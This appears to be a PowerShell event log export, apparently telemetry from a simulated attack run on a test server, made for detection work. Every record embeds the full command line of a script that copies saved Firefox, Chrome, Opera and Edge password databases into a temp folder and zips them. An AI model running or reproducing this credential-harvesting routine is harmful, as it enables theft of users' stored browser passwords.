{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:12.9770672"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:12.9770672"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:12.9925955"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:13.0029794"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:13.0029794"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:13.0029794"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:13.2411633"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3b29a765-1fde-4e8b-9dd8-7a549eb2d36d\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:15.4249922"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"        Add-Type -AssemblyName System.IO.Compression\r\n, \tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3b29a765-1fde-4e8b-9dd8-7a549eb2d36d\r\n\tPipelineId=1\r\n\tScriptName=C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\r\n\tCommandLine=        Add-Type -AssemblyName System.IO.Compression\r\n, CommandInvocation(Add-Type): \"Add-Type\"\r\nParameterBinding(Add-Type): name=\"AssemblyName\"; value=\"System.IO.Compression\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:15.4599312"},"EventRecordID":"1051","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"        Add-Type -AssemblyName System.IO.Compression.FileSystem\r\n, \tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=17\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3b29a765-1fde-4e8b-9dd8-7a549eb2d36d\r\n\tPipelineId=1\r\n\tScriptName=C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psm1\r\n\tCommandLine=        Add-Type -AssemblyName System.IO.Compression.FileSystem\r\n, CommandInvocation(Add-Type): \"Add-Type\"\r\nParameterBinding(Add-Type): name=\"AssemblyName\"; value=\"System.IO.Compression.FileSystem\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 21:57:15.6776275"},"EventRecordID":"1052","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=19\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2342c8dd-a52c-46c2-aec2-34c4bc8d3eef\r\n\tHostApplication=powershell.exe &amp; {$script_folder = \"$env:temp\\data.003\"\r\nif (test-path \"$script_folder\") {} else {new-item -path \"$env:temp\" -Name \"data.003\" -ItemType \"directory\" -force}\r\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\r\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$script_folder\\data.003Firefox_key4.db\"} else {}\r\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$script_folder\\data.003Firefox_logins.json\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$script_folder\\data.003Chrome_Login Data\"} else {}\r\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$script_folder\\data.003Chrome_Login Data For Account\"} else {}\r\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$script_folder\\data.003Opera_Login Data\"} else {}\r\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$script_folder\\data.003Edge_Login Data\"} else {} \r\ncompress-archive -path \"$script_folder\" -destinationpath \"$script_folder.zip\" -force}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3b29a765-1fde-4e8b-9dd8-7a549eb2d36d\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
